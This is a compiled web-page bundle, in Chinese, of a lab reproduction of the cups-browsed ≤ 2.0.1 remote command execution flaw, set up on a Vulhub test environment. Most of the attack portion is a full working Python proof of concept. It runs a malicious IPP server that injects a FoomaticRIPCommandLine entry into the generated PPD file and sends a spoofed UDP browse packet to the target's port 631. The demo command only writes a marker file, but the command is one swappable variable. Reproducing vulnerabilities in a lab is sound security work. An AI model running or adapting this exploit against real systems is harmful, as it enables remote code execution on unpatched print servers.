import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o,c,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const u={},l=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"OpenPrinting CUPS（通用 Unix 打印系统）是为类 Unix 操作系统开发的开源打印系统。它允许计算机充当打印服务器，高效管理本地和网络打印机。Cups-Browsed 是 CUPS 系统的一部分，是一个专门用于浏览网络上其他 CUPS 服务器共享的远程打印机的守护进程。它可以自动发现和配置网络打印机，让用户更容易访问和使用网络上共享的打印资源，无需手动设置。",-1),d=n("p",null,"在 Cups-Browsed 2.0.1 及之前的版本中，存在一个由 PPD（PostScript 打印机描述）文件中的 FoomaticRIPCommandLine 参数处理不当引起的问题。攻击者可以通过创建一个恶意的 IPP（互联网打印协议）服务器来利用这个漏洞，向易受攻击的 Cups-Browsed 实例发送精心制作的打印机信息，然后在运行易受攻击的 Cups-Browsed 的系统上执行任意命令。",-1),k=n("p",null,"参考链接：",-1),v={href:"https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8",target:"_blank",rel:"noopener noreferrer"},b=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cups-filters ≤ 2.0.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 2.4.7 版本 CUPS 服务器和 2.0.1 版本 Cups-Browsed 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，可以通过 <code>http://&lt;your-ip&gt;:631</code> 访问 CUPS 的 web 界面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20241008111625262.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,8),g={href:"https://github.com/vulhub/evil-ipp-server",target:"_blank",rel:"noopener noreferrer"},_={href:"https://github.com/vulhub/evil-ipp-server/blob/master/poc.py",target:"_blank",rel:"noopener noreferrer"},h=p(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py [evil-ipp-server-ip] [your-ip]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>例如：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># [evil-ipp-server-ip] 172.17.0.1
# [your-ip] 192.168.240.2 

python poc.py 172.17.0.1 192.168.240.2 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个脚本会在 <code>[evil-ipp-server-ip]</code> 上启动一个恶意的 IPP 服务器，并向目标机器 <code>[your-ip]</code> 上的 Cups-Browsed 服务发送一个 UDP 数据包。</p><p>一旦 Cups-Browsed 接收到请求，它将尝试连接到恶意的 IPP 服务器并收到恶意的 <code>printer-privacy-policy-uri</code> 属性，该属性中包含恶意 payload，其结构如下：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token punctuation">(</span>
    SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
    <span class="token string">b&#39;printer-privacy-policy-uri&#39;</span><span class="token punctuation">,</span>
    TagEnum<span class="token punctuation">.</span>uri
<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;https://www.google.com/&quot;\\n*FoomaticRIPCommandLine: &quot;&#39;</span> <span class="token operator">+</span>
    <span class="token string">b&#39;echo 1 &gt; /tmp/I_AM_VULNERABLE&#39;</span> <span class="token operator">+</span>
    <span class="token string">b&#39;&quot;\\n*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后，Cups-Browsed 会在 <code>/tmp/</code> 目录下创建一个临时 PPD 文件，我们的 payload 会被注入到这个文件中。下图是相关的 Cups-Browsed 日志：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20241008115116939.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>此时，命令还未执行，因为我们需要至少一个打印任务来触发命令的执行。</p><p>打印任务可能来自于正常用户，也可以来自攻击者。如果 TCP 631 端口开发，我们可以使用浏览器访问，并找到刚才增加的恶意 IPP 打印机，并创建一个“打印测试页面”的打印任务。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20241008114017948.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>任务执行后，进入容器即可发现，<code>echo 1 &gt; /tmp/I_AM_VULNERABLE</code> 命令已经成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20241008114134429.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2>`,14),y={href:"http://poc.py",target:"_blank",rel:"noopener noreferrer"},f=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys


<span class="token keyword">from</span> ippserver<span class="token punctuation">.</span>server <span class="token keyword">import</span> IPPServer
<span class="token keyword">import</span> ippserver<span class="token punctuation">.</span>behaviour <span class="token keyword">as</span> behaviour
<span class="token keyword">from</span> ippserver<span class="token punctuation">.</span>server <span class="token keyword">import</span> IPPRequestHandler
<span class="token keyword">from</span> ippserver<span class="token punctuation">.</span>constants <span class="token keyword">import</span> <span class="token punctuation">(</span>
    OperationEnum<span class="token punctuation">,</span> StatusCodeEnum<span class="token punctuation">,</span> SectionEnum<span class="token punctuation">,</span> TagEnum
<span class="token punctuation">)</span>
<span class="token keyword">from</span> ippserver<span class="token punctuation">.</span>parsers <span class="token keyword">import</span> Integer<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> Boolean
<span class="token keyword">from</span> ippserver<span class="token punctuation">.</span>request <span class="token keyword">import</span> IppRequest


<span class="token keyword">class</span> <span class="token class-name">MaliciousPrinter</span><span class="token punctuation">(</span>behaviour<span class="token punctuation">.</span>StatelessPrinter<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>command <span class="token operator">=</span> command
        <span class="token builtin">super</span><span class="token punctuation">(</span>MaliciousPrinter<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">printer_list_attributes</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        attr <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token comment"># rfc2911 section 4.4</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;printer-uri-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>uri
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>printer_uri<span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;uri-authentication-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>keyword
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;none&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;uri-security-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>keyword
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;none&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;printer-name&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>name_without_language
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;Main Printer&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;printer-info&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>text_without_language
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;Main Printer Info&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;printer-make-and-model&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>text_without_language
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;HP 0.00&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;printer-state&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>enum
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>Enum<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token comment"># XXX 3 is idle</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;printer-state-reasons&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>keyword
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;none&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;ipp-versions-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>keyword
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;1.1&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;operations-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>enum
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
                Enum<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">(</span>
                    OperationEnum<span class="token punctuation">.</span>print_job<span class="token punctuation">,</span>  <span class="token comment"># (required by cups)</span>
                    OperationEnum<span class="token punctuation">.</span>validate_job<span class="token punctuation">,</span>  <span class="token comment"># (required by cups)</span>
                    OperationEnum<span class="token punctuation">.</span>cancel_job<span class="token punctuation">,</span>  <span class="token comment"># (required by cups)</span>
                    OperationEnum<span class="token punctuation">.</span>get_job_attributes<span class="token punctuation">,</span>  <span class="token comment"># (required by cups)</span>
                    OperationEnum<span class="token punctuation">.</span>get_printer_attributes<span class="token punctuation">,</span>
                <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;multiple-document-jobs-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>boolean
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>Boolean<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;charset-configured&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>charset
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;utf-8&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;charset-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>charset
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;utf-8&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;natural-language-configured&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>natural_language
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;en&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;generated-natural-language-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>natural_language
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;en&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;document-format-default&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>mime_media_type
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;application/pdf&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;document-format-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>mime_media_type
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;application/pdf&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;printer-is-accepting-jobs&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>boolean
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>Boolean<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;queued-job-count&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>integer
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>Integer<span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;pdl-override-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>keyword
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;not-attempted&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;printer-up-time&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>integer
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>Integer<span class="token punctuation">(</span>self<span class="token punctuation">.</span>printer_uptime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;compression-supported&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>keyword
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;none&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span>
                SectionEnum<span class="token punctuation">.</span>printer<span class="token punctuation">,</span>
                <span class="token string">b&#39;printer-privacy-policy-uri&#39;</span><span class="token punctuation">,</span>
                TagEnum<span class="token punctuation">.</span>uri
            <span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">b&#39;https://www.google.com/&quot;\\n*FoomaticRIPCommandLine: &quot;&#39;</span> <span class="token operator">+</span>
                self<span class="token punctuation">.</span>command<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
                <span class="token string">b&#39;&quot;\\n*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>

        <span class="token punctuation">}</span>
        attr<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>minimal_attributes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> attr

    <span class="token keyword">def</span> <span class="token function">handle_print_job</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> req<span class="token punctuation">,</span> _psfile<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;target connected, sending payload ...&quot;</span><span class="token punctuation">)</span>
        attributes <span class="token operator">=</span> self<span class="token punctuation">.</span>printer_list_attributes<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> IppRequest<span class="token punctuation">(</span>
            self<span class="token punctuation">.</span>version<span class="token punctuation">,</span>
            StatusCodeEnum<span class="token punctuation">.</span>ok<span class="token punctuation">,</span>
            req<span class="token punctuation">.</span>request_id<span class="token punctuation">,</span>
            attributes<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">send_browsed_packet</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> ipp_server_host<span class="token punctuation">,</span> ipp_server_port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;sending udp packet to %s:%d ...&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>

    printer_type <span class="token operator">=</span> <span class="token number">0x00</span>
    printer_state <span class="token operator">=</span> <span class="token number">0x03</span>
    printer_uri <span class="token operator">=</span> <span class="token string">&#39;http://%s:%d/printers/NAME&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>
        ipp_server_host<span class="token punctuation">,</span> ipp_server_port<span class="token punctuation">)</span>
    printer_location <span class="token operator">=</span> <span class="token string">&#39;Office HQ&#39;</span>
    printer_info <span class="token operator">=</span> <span class="token string">&#39;Printer&#39;</span>

    message <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token string">&#39;%x %x %s &quot;%s&quot; &quot;%s&quot;&#39;</span> <span class="token operator">%</span>
                    <span class="token punctuation">(</span>printer_type<span class="token punctuation">,</span>
                     printer_state<span class="token punctuation">,</span>
                     printer_uri<span class="token punctuation">,</span>
                     printer_location<span class="token punctuation">,</span>
                     printer_info<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;UTF-8&#39;</span><span class="token punctuation">)</span>

    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;%s &lt;LOCAL_HOST&gt; &lt;TARGET_HOST&gt;&quot;</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        quit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    SERVER_HOST <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    SERVER_PORT <span class="token operator">=</span> <span class="token number">12345</span>

    command <span class="token operator">=</span> <span class="token string">&quot;echo 1 &gt; /tmp/I_AM_VULNERABLE&quot;</span>

    server <span class="token operator">=</span> IPPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span> SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">,</span>
                       IPPRequestHandler<span class="token punctuation">,</span> MaliciousPrinter<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;malicious ipp server listening on &#39;</span><span class="token punctuation">,</span> server<span class="token punctuation">.</span>server_address<span class="token punctuation">)</span>
    server_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">)</span>
    server_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
    server_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    TARGET_HOST <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
    TARGET_PORT <span class="token operator">=</span> <span class="token number">631</span>
    send_browsed_packet<span class="token punctuation">(</span>TARGET_HOST<span class="token punctuation">,</span> TARGET_PORT<span class="token punctuation">,</span> SERVER_HOST<span class="token punctuation">,</span> SERVER_PORT<span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> server_thread<span class="token punctuation">.</span>is_alive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
            server_thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">)</span>  
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>  
        <span class="token keyword">pass</span>  
    <span class="token keyword">finally</span><span class="token punctuation">:</span>  
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Server has shut down.&quot;</span><span class="token punctuation">)</span>  
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div 